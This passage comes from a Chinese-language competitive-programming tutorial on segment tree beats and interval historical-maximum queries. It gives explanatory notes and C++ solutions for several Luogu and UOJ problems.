type>\n            inline void put(const type &x,bool flag=1){write(x),flag?putchar('\\n'):putchar(' ');}\n        }\n        #ifndef LOCAL\n            #undef getchar\n            #undef flush\n            #undef putchar\n        #endif\n    }using namespace IO::usr;\n}using namespace ly::IO::usr;\nint in[_];\nstruct Node{int max1,max2,min1,min2,cmin,cmax,sum,tmin,tmax,tsum;} tree[_<<2];\ninline void pushup(int k){\n    nt.sum=lt.sum+rt.sum;\n    nt.max1=max(lt.max1,rt.max1);\n    if(lt.max1==rt.max1) nt.max2=max(lt.max2,rt.max2),nt.cmax=lt.cmax+rt.cmax;\n    else nt.max2=max(min(lt.max1,rt.max1),max(lt.max2,rt.max2)),nt.cmax=lt.max1>rt.max1?lt.cmax:rt.cmax;\n    nt.min1=min(lt.min1,rt.min1);\n    if(lt.min1==rt.min1) nt.min2=min(lt.min2,rt.min2),nt.cmin=lt.cmin+rt.cmin;\n    else nt.min2=min(max(lt.min1,rt.min1),min(lt.min2,rt.min2)),nt.cmin=lt.min1<rt.min1?lt.cmin:rt.cmin;\n}\nvoid build(int k,int l,int r){\n    nt.tmin=inf,nt.tmax=-inf,nt.tsum=0;\n    if(l==r) return nt.max1=nt.min1=nt.sum=in[l],nt.max2=-inf,nt.min2=inf,nt.cmax=nt.cmin=1,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\ninline void pushsum(int k,int l,int r,int v){\n    nt.sum+=(r-l+1ll)*v;\n    nt.max1+=v,nt.min1+=v;\n    if(nt.max2!=-inf) nt.max2+=v;\n    if(nt.min2!=inf) nt.min2+=v;\n    if(nt.tmin!=inf) nt.tmin+=v;\n    if(nt.tmax!=-inf) nt.tmax+=v;\n    nt.tsum+=v;\n}\ninline void pushmin(int k,int v){\n    if(nt.max1<=v) return;\n    nt.sum-=(nt.max1-v)*nt.cmax;\n    if(nt.max1==nt.min2) nt.min2=v;\n    if(nt.max1==nt.min1) nt.min1=v;\n    nt.tmax=min(nt.tmax,v),nt.max1=v,nt.tmin=v;\n}\ninline void pushmax(int k,int v){\n    if(nt.min1>=v) return;\n    nt.sum+=(v-nt.min1)*nt.cmin;\n    if(nt.min1==nt.max2) nt.max2=v;\n    if(nt.min1==nt.max1) nt.max1=v;\n    nt.tmin=max(nt.tmin,v),nt.min1=v,nt.tmax=v;\n}\ninline void pushdown(int k,int l,int r,int mid){\n    if(nt.tsum) pushsum(ls(k),l,mid,nt.tsum),pushsum(rs(k),mid+1,r,nt.tsum);\n    if(nt.tmin!=inf) pushmin(ls(k),nt.tmin),pushmin(rs(k),nt.tmin);\n    if(nt.tmax!=-inf) pushmax(ls(k),nt.tmax),pushmax(rs(k),nt.tmax);\n    nt.tsum=0,nt.tmax=-inf,nt.tmin=inf;\n}\nvoid modify_sum(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushsum(k,l,r,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k,l,r,mid);\n    if(x<=mid) modify_sum(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_sum(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nvoid modify_min(int k,int l,int r,int x,int y,int v){\n    if(nt.max1<=v) return;\n    if(l>=x&&r<=y&&v>nt.max2) return pushmin(k,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k,l,r,mid);\n    if(x<=mid) modify_min(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_min(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nvoid modify_max(int k,int l,int r,int x,int y,int v){\n    if(nt.min1>=v) return;\n    if(l>=x&&r<=y&&v<nt.min2) return pushmax(k,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k,l,r,mid);\n    if(x<=mid) modify_max(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_max(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query_sum(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.sum;\n    int mid=(l+r)>>1,res=0;\n    pushdown(k,l,r,mid);\n    if(x<=mid) res+=query_sum(ls(k),l,mid,x,y);\n    if(y>mid) res+=query_sum(rs(k),mid+1,r,x,y);\n    return res;\n}\nint query_min(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.min1;\n    int mid=(l+r)>>1,res=inf;\n    pushdown(k,l,r,mid);\n    if(x<=mid) res=min(res,query_min(ls(k),l,mid,x,y));\n    if(y>mid) res=min(res,query_min(rs(k),mid+1,r,x,y));\n    return res;\n}\nint query_max(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.max1;\n    int mid=(l+r)>>1,res=-inf;\n    pushdown(k,l,r,mid);\n    if(x<=mid) res=max(res,query_max(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query_max(rs(k),mid+1,r,x,y));\n    return res;\n}\ninline void subtask(){\n    int n,m;read(n);\n    for(int i=1;i<=n;i++) read(in[i]);\n    build(1,1,n);read(m);\n    while(m--){\n        int op,l,r,x;read(op),read(l),read(r);\n        if(op<=3) read(x);\n        if(op==1) modify_sum(1,1,n,l,r,x);\n        if(op==2) modify_max(1,1,n,l,r,x);\n        if(op==3) modify_min(1,1,n,l,r,x);\n        if(op==4) put(query_sum(1,1,n,l,r));\n        if(op==5) put(query_max(1,1,n,l,r));\n        if(op==6) put(query_min(1,1,n,l,r));\n    }\n}\nsigned main(){\n    //ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n### 区间历史最值\n\n#### 传统懒标记\n\n对于一些不太复杂的问题，我们可以沿用传统懒标记的做法\n\n**P4314 CPU 监控**\n\nhttps://www.luogu.com.cn/problem/P4314\n\n**题目描述**\n\n$n$ 个数，$m$ 个操作：\n\n1. 询问区间最大值\n2. 询问历史区间历史最大值\n3. 区间加\n4. 区间推平\n\n**数据范围**\n\n$1\\le n,m\\le 10^5$ ，数字值域为 int 取值范围\n\n**笔记**\n\n本题和势能线段树没有什么关系，只是考虑以下如何用传统的懒标记解决区间历史最值问题\n\n第一个难点是，既有区间加和区间推平，懒标记怎么下放。我们不难发现，作用完区间推平之后，后面无论是区间加还是区间推平，都可以归为区间推平（毕竟推平后所有数就都相等了）。所以我们可以考虑先下放区间加标记，再下放区间推平标记。下放区间加标记时，判断是否已经有了区间推平标记，如果有，就直接加到区间推平标记上，如果没有，就加到区间加标记上。下放区间推平标记就正常下放即可\n\n第二个难点是如何处理区间历史最值，首先一个朴素的想法就是多维护一个区间历史最大值 $hmax$ 即可，但这样就会出现问题：比如父节点一开始都为 $1$，然后对 $3$ 推平，然后对 $2$ 推平，然后后面操作访问到子节点时，子节点只会接收到对 $2$ 推平的懒标记，之前对 $3$ 推平的懒标记就被忽略了，但是子节点的历史最值是 $3$\n\n因此我们还需要记录推平标记的历史最值，加减标记的历史最值\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\n#define _ 100005\ntypedef pair<int,int> pii;\nstruct Node{int mx,hmx,cov,hcov,iscov,add,hadd;} tree[_<<2];\nint in[_];\ninline void pushup(int k){nt.mx=max(lt.mx,rt.mx),nt.hmx=max(lt.hmx,rt.hmx);}\nvoid build(int k,int l,int r){\n    nt.iscov=false,nt.add=0;\n    if(l==r) return nt.mx=nt.hmx=in[l],void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);build(rs(k),mid+1,r);\n    pushup(k);\n}\nvoid pushcov(int k,int v,int hv){\n    if(nt.iscov) nt.hcov=max(nt.hcov,hv);\n    else nt.iscov=true,nt.hcov=hv;\n    nt.hmx=max(nt.hmx,hv);\n    nt.cov=nt.mx=v;\n    nt.add=0;\n}\nvoid pushsum(int k,int v,int hv){\n    if(nt.iscov) pushcov(k,nt.cov+v,nt.cov+hv);\n    else{\n        nt.hadd=max(nt.hadd,nt.add+hv);\n        nt.hmx=max(nt.hmx,nt.mx+hv);\n        nt.add+=v,nt.mx+=v;\n    }\n}\nvoid pushdown(int k){\n    pushsum(ls(k),nt.add,nt.hadd);\n    pushsum(rs(k),nt.add,nt.hadd);//nt.add可能为0，但是仍下放，因为nt.hadd会有贡献\n    nt.add=nt.hadd=0;\n    if(nt.iscov){\n        pushcov(ls(k),nt.cov,nt.hcov);\n        pushcov(rs(k),nt.cov,nt.hcov);\n        nt.iscov=false;\n    }\n}\nvoid modify_sum(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushsum(k,v,v),void();\n    pushdown(k);\n    int mid=(l+r)>>1;\n    if(x<=mid) modify_sum(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_sum(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nvoid modify_cover(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushcov(k,v,v),void();\n    pushdown(k);\n    int mid=(l+r)>>1;\n    if(x<=mid) modify_cover(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_cover(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query_max(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.mx;\n    pushdown(k);\n    int mid=(l+r)>>1,res=-inf;\n    if(x<=mid) res=max(res,query_max(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query_max(rs(k),mid+1,r,x,y));\n    return res;\n}\nint query_hmax(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.hmx;\n    pushdown(k);\n    int mid=(l+r)>>1,res=-inf;\n    if(x<=mid) res=max(res,query_hmax(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query_hmax(rs(k),mid+1,r,x,y));\n    return res;\n}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    int m;cin>>m;\n    while(m--){\n        char op;int l,r,x;cin>>op>>l>>r;\n        if(op=='Q') cout<<query_max(1,1,n,l,r)<<endl;\n        if(op=='A') cout<<query_hmax(1,1,n,l,r)<<endl;\n        if(op=='P') cin>>x,modify_sum(1,1,n,l,r,x);\n        if(op=='C') cin>>x,modify_cover(1,1,n,l,r,x);\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### 最值操作和维护的最值同向\n\n同向指的是，比如，我维护区间最小值，操作也是区间取 min，这种情况下可以继续沿用上述传统的懒标记方法\n\n**#164. 【清华集训2015】V**\n\nhttps://vjudge.net/problem/UniversalOJ-164\n\n**题目描述**\n\n给出一个长度为 $n(n\\le 5\\times 10^5)$ 的序列，$m(m\\le 5\\times 10^5)$ 次操作：\n\n1. 区间加（非负数）\n2. 区间减 $k$ （非负数）后再对 $0$ 取 max\n3. 区间推平（非负数）\n4. 单点询问\n5. 单点询问历史最大值\n\n数字值域最大为 $10^9$\n\n**笔记**\n\n为了简单起见，我们把区间推平操作给转化为先减去正无穷，然后对 $x$ 取 max。不然再搞一个区间推平的懒标记就有点复杂了\n\n于是本题和上题的区别就是多了个区间取 max，我们多维护两个懒标记：取 max 懒标记，历史最大取 max 懒标记\n\n取 max 标记和加减标记下放时如何处理在前文已经说了\n\n值得注意的是本题涉及到减去正无穷，所以有两个注意点：首先这个无穷值不能太小，不然我加了一堆 $10^9$，然后再减去无穷值之后得到的结果还是正数；这个无穷值不能太大，不然我减两次无穷就炸了，代码中的解决方案是判断当前值是否小于了 `-inf`，小于的话就不再继续减了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=5e14;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 500005\nint in[_],n,m;\nstruct Node{int mx,hmx,add,hadd,tmx,htmx;} tree[_<<2];\ninline void pushup(int k){nt.mx=max(lt.mx,rt.mx),nt.hmx=max(lt.hmx,rt.hmx);}\nvoid build(int k,int l,int r){\n    nt.tmx=nt.htmx=-inf;\n    if(l==r) return nt.mx=nt.hmx=in[l],void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);build(rs(k),mid+1,r);\n    pushup(k);\n}\ninline void pushadd(int k,int v,int hv){\n    nt.hadd=max(nt.hadd,nt.add+hv);\n    nt.hmx=max(nt.hmx,nt.mx+hv);\n    if(nt.tmx!=-inf) nt.htmx=max(nt.htmx,nt.tmx+hv),nt.tmx+=nt.tmx<-inf?0:v;\n    nt.add+=nt.add<-inf?0:v,nt.mx+=nt.mx<-inf?0:v;\n}\ninline void pushmax(int k,int v,int hv){\n    nt.htmx=max(nt.htmx,hv);\n    nt.hmx=max(nt.hmx,max(nt.mx,hv));\n    nt.tmx=max(nt.tmx,v),nt.mx=max(nt.mx,v);\n}\ninline void pushdown(int k){\n    pushadd(ls(k),nt.add,nt.hadd);\n    pushadd(rs(k),nt.add,nt.hadd);\n    nt.add=nt.hadd=0;\n    if(nt.tmx!=-inf){\n        pushmax(ls(k),nt.tmx,nt.htmx);\n        pushmax(rs(k),nt.tmx,nt.htmx);\n        nt.tmx=nt.htmx=-inf;\n    }\n}\nvoid modify_add(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushadd(k,v,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) modify_add(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_add(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nvoid modify_max(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y) return pushmax(k,v,v),void();\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) modify_max(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_max(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query_p(int k,int l,int r,int x){\n    if(l==r) return nt.mx;\n    pushdown(k);\n    int mid=(l+r)>>1;\n    if(x<=mid) return query_p(ls(k),l,mid,x);\n    else return query_p(rs(k),mid+1,r,x);\n}\nint query_h(int k,int l,int r,int x){\n    if(l==r) return nt.hmx;\n    pushdown(k);\n    int mid=(l+r)>>1;\n    if(x<=mid) return query_h(ls(k),l,mid,x);\n    else return query_h(rs(k),mid+1,r,x);\n}\ninline void subtask(){\n    cin>>n>>m;\n    for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    while(m--){\n        int op,l,r,x;cin>>op>>l;\n        if(op==1) cin>>r>>x,modify_add(1,1,n,l,r,x);\n        if(op==2) cin>>r>>x,modify_add(1,1,n,l,r,-x),modify_max(1,1,n,l,r,0);\n        if(op==3) cin>>r>>x,modify_add(1,1,n,l,r,-inf),modify_max(1,1,n,l,r,x);\n        if(op==4) cout<<query_p(1,1,n,l)<<endl;\n        if(op==5) cout<<query_h(1,1,n,l)<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### 最值操作和维护的最值反向\n\n比如，我维护区间最小值，但操作是区间取 max，这时候就需要使用势能线段树了\n\n**P6242 【模板】线段树 3（区间最值操作、区间历史最值）**\n\nhttps://www.luogu.com.cn/problem/P6242\n\n**题目描述**\n\n给出一个长度为 $n$ 的数列 $A$，同时定义一个辅助数组 $B$，$B$ 开始与 $A$ 完全相同。接下来进行了 $m$ 次操作，操作有五种类型，按以下格式给出：\n\n- `1 l r k`：对于所有的 $i\\in[l,r]$，将 $A_i$ 加上 $k$（$k$ 可以为负数）。\n- `2 l r v`：对于所有的 $i\\in[l,r]$，将 $A_i$ 变成 $\\min(A_i,v)$。\n- `3 l r`：求 $\\sum_{i=l}^{r}A_i$。\n- `4 l r`：对于所有的 $i\\in[l,r]$，求 $A_i$ 的最大值。\n- `5 l r`：对于所有的 $i\\in[l,r]$，求 $B_i$ 的最大值。\n\n在每一次操作后，我们都进行一次更新，让 $B_i\\gets\\max(B_i,A_i)$。\n\n**数据范围**\n\n对于全部测试数据，保证 $1\\leq n,m\\leq 5\\times 10^5$，$-5\\times10^8\\leq A_i\\leq 5\\times10^8$，$op\\in[1,5]$，$1 \\leq l\\leq r \\leq n$，$-2000\\leq k\\leq 2000$，$-5\\times10^8\\leq v\\leq 5\\times10^8$。\n\n**笔记**\n\n如果本题没有区间历史最值的话，做法在之前已经说过了。我们回顾一下之前的做法，之前的做法中维护区间次值，实际上是把维护的数分为了两个部分：最值和非最值。如果操作仅对最值产生影响，那么可以快速处理。如果操作影响到了非最值，那么就暴力处理，同时这个划分方法确保了暴力处理是可以让势能下降的，从而确保了时间复杂度。\n\n并且我们还会发现，划分数域后，所有的操作都可以视为对最值进行直接的修改，即使在某个节点上是对非最值修改，那么递归下去，也是对某个子节点的最值进行修改。这样一来，我们可以把所有的取最值操作转化为对最值的加减操作。比如当前最大值为 $x$，我想对 $k(k<x)$ 取 min，那么我们可以直接让最大值减去 $x-k$ ，在下传标记的时候，我们判断一下左右子节点的最大值是否是父节点的最大值，是的话就把这个仅对最大值操作的标记传过去。这个转化可以让我们抛弃掉不太好处理的区间最值标记，转向更加处理的加减标记\n\n现在这道题，如果我们仍然沿用传统的懒标记方法就不太好处理了。但这种反向的特性，给了我们划分数域处理的机会。我们把区间内的数字划分为最大值和非最大值两部分，每部分维护加减懒标记和历史最大加减懒标记。\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 500005\nstruct Tag{int add1,hadd1,add2,hadd2;};//1结尾为作用于最大，2结尾为作用于次大\nstruct Node{int mx,hmx,se,sum,cnt1;Tag tag;} tree[_<<2];\nint in[_],n,m;\ninline void pushup(int k){\n    nt.sum=lt.sum+rt.sum;\n    nt.mx=max(lt.mx,rt.mx);\n    nt.hmx=max(lt.hmx,rt.hmx);\n    if(lt.mx==rt.mx) nt.cnt1=lt.cnt1+rt.cnt1,nt.se=max(lt.se,rt.se);\n    else nt.se=max(min(lt.mx,rt.mx),max(lt.se,rt.se)),nt.cnt1=lt.mx>rt.mx?lt.cnt1:rt.cnt1;\n}\nvoid build(int k,int l,int r){\n    if(l==r) return nt.mx=nt.hmx=nt.sum=in[l],nt.cnt1=1,nt.se=-inf,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);build(rs(k),mid+1,r);\n    pushup(k);\n}\ninline void update(int k,int l,int r,Tag tag){\n    nt.sum+=tag.add1*nt.cnt1+tag.add2*(r-l+1-nt.cnt1);\n    nt.tag.hadd1=max(nt.tag.hadd1,nt.tag.add1+tag.hadd1);\n    nt.tag.hadd2=max(nt.tag.hadd2,nt.tag.add2+tag.hadd2);\n    nt.tag.add1+=tag.add1;\n    nt.tag.add2+=tag.add2;\n    nt.hmx=max(nt.hmx,nt.mx+tag.hadd1);\n    nt.mx+=tag.add1;\n    if(nt.se!=-inf) nt.se+=tag.add2;\n}\ninline void pushdown(int k,int l,int r){\n    int mx=max(lt.mx,rt.mx),mid=(l+r)>>1;\n    Tag tag1=nt.tag,tag2=nt.tag;\n    tag2.add1=nt.tag.add2,tag2.hadd1=nt.tag.hadd2;//构造区间内没有父节点最大值时，需要作用的标记。此时子节点的最大值相当于父节点的非最大值\n    if(mx==lt.mx) update(ls(k),l,mid,tag1);\n    else update(ls(k),l,mid,tag2);\n    if(mx==rt.mx) update(rs(k),mid+1,r,tag1);\n    else update(rs(k),mid+1,r,tag2);\n    nt.tag.add1=nt.tag.add2=nt.tag.hadd1=nt.tag.hadd2=0;\n}\nvoid modify_add(int k,int l,int r,int x,int y,int v){\n    if(l>=x&&r<=y){\n        Tag tag;tag.add2=tag.hadd2=tag.add1=tag.hadd1=v;//无论是最大值还是非最大值，都需要+v\n        update(k,l,r,tag);\n        return;\n    }\n    int mid=(l+r)>>1;\n    pushdown(k,l,r);\n    if(x<=mid) modify_add(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_add(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nvoid modify_min(int k,int l,int r,int x,int y,int v){\n    if(v>=nt.mx) return;\n    if(l>=x&&r<=y&&v>nt.se){\n        Tag tag;tag.add1=tag.hadd1=v-nt.mx,tag.add2=tag.hadd2=0;//仅最大值作用\n        update(k,l,r,tag);\n        return;\n    }\n    int mid=(l+r)>>1;\n    pushdown(k,l,r);\n    if(x<=mid) modify_min(ls(k),l,mid,x,y,v);\n    if(y>mid) modify_min(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query_sum(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.sum;\n    int mid=(l+r)>>1,res=0;\n    pushdown(k,l,r);\n    if(x<=mid) res+=query_sum(ls(k),l,mid,x,y);\n    if(y>mid) res+=query_sum(rs(k),mid+1,r,x,y);\n    return res;\n}\nint query_max(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.mx;\n    int mid=(l+r)>>1,res=-inf;\n    pushdown(k,l,r);\n    if(x<=mid) res=max(res,query_max(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query_max(rs(k),mid+1,r,x,y));\n    return res;\n}\nint query_hmax(int k,int l,int r,int x,int y){\n    if(l>=x&&r<=y) return nt.hmx;\n    int mid=(l+r)>>1,res=-inf;\n    pushdown(k,l,r);\n    if(x<=mid) res=max(res,query_hmax(ls(k),l,mid,x,y));\n    if(y>mid) res=max(res,query_hmax(rs(k),mid+1,r,x,y));\n    return res;\n}\ninline void subtask(){\n    cin>>n>>m;for(int i=1;i<=n;i++) cin>>in[i];\n    build(1,1,n);\n    while(m--){\n        int op,l,r,x;cin>>op>>l>>r;\n        if(op==1) cin>>x,modify_add(1,1,n,l,r,x);\n        if(op==2) cin>>x,modify_min(1,1,n,l,r,x);\n        if(op==3) cout<<query_sum(1,1,n,l,r)<<endl;\n        if(op==4) cout<<query_max(1,1,n,l,r)<<endl;\n        if(op==5) cout<<query_hmax(1,1,n,l,r)<<endl;\n    }\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### 区间历史最值求和\n\n**题目描述**\n\n给出一个长度为 $n(n\\le 10^5)$ 的序列，$m(m\\le 10^5)$ 次操作：\n\n1. 区间加\n2. 询问给定区间的区间历史最大值之和\n\n**笔记**\n\n我们要维护的序列为 $A_i$，历史最大值为序列 $B_i$\n\n然后我们令 $C_i=A_i-B_i$，容易发现 $C_i\\le 0$ 恒成立\n\n当我们对 $A_i$ 加 $x$ 的时候，$C_i$ 也加了 $x$。此时，如果 $C_i$ 仍小于等于 $0$，说明 $A_i+x$ 并没有更新掉历史最大值。 如果 $C_i$ 大于 0 了，说明 $A_i+x$ 比历史最大值还大，$B_i$ 更新为 $A_i+x$，于是 $C_i$ 又变为了 0\n\n于是我们可以再维护 $C_i$，实现 区间加、区间取 $min$、询问区间和 即可\n\n询问区间历史最大值之和时，$\\sum B_i=\\sum A_i-\\sum C_i$\n\n### 题目\n\n#### 【UR #19】前进四\n\n**题目描述**\n\n给出一个长度为 $n(n\\le 10^6)$ 的序列 $A$ 和 $m(m\\le 10^6)$ 个操作：\n\n1. 将序列中指定位置修改为 $x$\n2. 给出 $x$，求 $A_x,A_{x+1},...,A_n$ 的不同后缀最小值个数\n\n**笔记**\n\n我们给每个询问和操作分配一个时间，第 $i$ 个询问或操作的时间是 $i+1$。将序列的初始状态视为有 $n$ 个操作一，时间都是 $1$\n\n然后我们对于每个位置，求出这个位置上哪些时间段内是哪些数，比如一个位置初始时是 $1$，在操作 $3$ 被修改成了 $5$，那么我们就说这个位置的数在时间段 $1\\sim 3$ 是 $1$，在时间段 $4\\sim q+1$ 是 $5$\n\n然后我们建立一个线段树，这个线段树的下标表示的是时间，维护在某个时间的后缀最小值为多少\n\n然后我们从序列的最后一个位置开始向前枚举，当我们枚举到一个位置时，这个位置可能在不同时间有不同的数字，因此不同的时间，这个位置开始的后缀最小值也是不一样的。我们可以根据之前求出的哪些时间段内是哪些数，进行区间取 min。同时，可能还会存在关于这个位置的询问，但我们目前做的只能知道这个位置在不同时间的后缀最小值是多少\n\n我们考虑，当我们从序列的最后一个位置开始向前枚举，不断在某个时间点上对一些数字取 $min$ 的时候，成功取 min （即取 min 后数字变得更小了）的次数即为，在当前时间点上，从当前枚举到的位置作为起点开始的后缀最小值个数。成功取 min 的次数可以在区间取 min 的时候顺手记录\n\n因此，关于这个位置的询问，我们只需要根据这个询问的时间点，在线段树上进行单点询问即可\n\n回顾我们这个离线的过程，从序列的最后一个位置开始向前枚举，可以使得当前的状态仅由后面的位置贡献产生；线段树维护在某个时间的后缀最小值为多少，可以做到快速处理修改操作产生的后续影响\n\n```cpp\n#include<bits/stdc++.h>\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define nt tree[k]\n#define lt tree[ls(k)]\n#define rt tree[rs(k)]\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 1000006\n#define LOCAL\nnamespace ly\n{\n    namespace IO\n    {\n        #ifndef LOCAL\n            constexpr auto maxn=1<<20;\n            char in[maxn],out[maxn],*p1=in,*p2=in,*p3=out;\n            #define getchar() (p1==p2&&(p2=(p1=in)+fread(in,1,maxn,stdin),p1==p2)?EOF:*p1++)\n            #define flush() (fwrite(out,1,p3-out,stdout))\n            #define putchar(x) (p3==out+maxn&&(flush(),p3=out),*p3++=(x))\n            class Flush{public:~Flush(){flush();}}_;\n        #endif\n        namespace usr\n        {\n            template<typename type>\n            inline type read(type &x)\n            {\n                x=0;bool flag(0);char ch=getchar();\n                while(!isdigit(ch)) flag^=ch=='-',ch=getchar();\n                while(isdigit(ch)) x=(x<<1)+(x<<3)+(ch^48),ch=getchar();\n                return flag?x=-x:x;\n            }\n            template<typename type>\n            inline void write(type x)\n            {\n                x<0?x=-x,putchar('-'):0;\n                static short Stack[50],top(0);\n                do Stack[++top]=x%10,x/=10;while(x);\n                while(top) putchar(Stack[top--]|48);\n            }\n            inline char read(char &x){do x=getchar();while(isspace(x));return x;}\n            inline char write(const char &x){return putchar(x);}\n            inline void read(char *x){static char ch;read(ch);do *(x++)=ch;while(!isspace(ch=getchar())&&~ch);}\n            template<typename type>inline void write(type *x){while(*x)putchar(*(x++));}\n            inline void read(string &x){static char ch;read(ch),x.clear();do x+=ch;while(!isspace(ch=getchar())&&~ch);}\n            inline void write(const string &x){for(int i=0,len=x.length();i<len;++i)putchar(x[i]);}\n            template<typename type,typename...T>inline void read(type &x,T&...y){read(x),read(y...);}\n            template<typename type,typename...T>\n            inline void write(const type &x,const T&...y){write(x),putchar(' '),write(y...),sizeof...(y)^1?0:putchar('\\n');}\n            template<typename type>\n            inline void put(const type &x,bool flag=1){write(x),flag?putchar('\\n'):putchar(' ');}\n        }\n        #ifndef LOCAL\n            #undef getchar\n            #undef flush\n            #undef putchar\n        #endif\n    }using namespace IO::usr;\n}using namespace ly::IO::usr;\nstruct Node{int mx,se,val,tag;} tree[_<<2];\ninline void pushup(int k){\n    nt.mx=max(lt.mx,rt.mx);\n    if(lt.mx==rt.mx) nt.se=max(lt.se,rt.se);\n    else nt.se=max(min(lt.mx,rt.mx),max(lt.se,rt.se));\n}\ninline void update(int k,int v,int d){if(v<nt.mx) nt.mx=nt.tag=v,nt.val+=d;}\ninline void pushdown(int k){if(nt.tag) update(ls(k),nt.tag,nt.val),update(rs(k),nt.tag,nt.val),nt.tag=0,nt.val=0;}\nvoid build(int k,int l,int r){\n    if(l==r) return nt.mx=inf,nt.se=-1,void();\n    int mid=(l+r)>>1;\n    build(ls(k),l,mid);\n    build(rs(k),mid+1,r);\n    pushup(k);\n}\nvoid modify(int k,int l,int r,int x,int y,int v){\n    if(nt.mx<=v) return;\n    if(l>=x&&r<=y&&nt.se<v) return update(k,v,1),void();\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) modify(ls(k),l,mid,x,y,v);\n    if(y>mid) modify(rs(k),mid+1,r,x,y,v);\n    pushup(k);\n}\nint query(int k,int l,int r,int x){\n    if(l==r) return nt.val;\n    int mid=(l+r)>>1;\n    pushdown(k);\n    if(x<=mid) return query(ls(k),l,mid,x);\n    else return query(rs(k),mid+1,r,x);\n}\nstruct O{int x,l,r;};\nstruct Q{int id,time;};\nvector<O> g[_];\nvector<Q> q[_];\nint cntq,ans[_];\ninline void subtask(){\n    int n,m;read(n),read(m);\n    for(int i=1,x;i<=n;i++) read(x),g[i].push_back(O{x,1,m+1});\n    for(int i=1;i<=m;i++){\n        int op,x,v;read(op),read(x);\n        if(op==1){\n            read(v);\n            (*(--g[x].end())).r=i-1;\n            g[x].push_back(O{v,i,m+1});\n        }else q[x].push_back(Q{++cntq,i});\n    }\n    build(1,1,m+1);\n    for(int i=n;i>=1;i--){\n        for(auto to:g[i]) modify(1,1,m+1,to.l,to.r,to.x);\n        for(auto to:q[i]) ans[to.id]=query(1,1,m+1,to.time);\n    }\n    